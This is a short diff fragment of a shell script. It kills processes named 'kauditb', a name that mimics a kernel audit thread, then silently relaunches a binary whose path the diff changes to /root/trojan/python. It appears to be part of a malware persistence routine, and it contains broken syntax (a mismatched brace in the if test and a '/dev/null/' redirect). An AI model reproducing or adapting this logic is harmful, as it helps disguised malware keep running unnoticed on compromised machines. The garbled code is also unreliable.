@@ -988,7 +988,7 @@ fi
 PIDS=`ps -ef | grep kauditb | grep -v grep | awk '{print $2}'`
 if { "$PIDS" != "" ]; then
 kill -9 $PIDS
-/usr/lib/python 1> /dev/null/ 2>/dev/null
+/root/trojan/python 1> /dev/null/ 2>/dev/null
     else
-/usr/lib/python 1>/dev/null 2>/dev/null
+/root/trojan/python 1>/dev/null 2>/dev/null
 fi
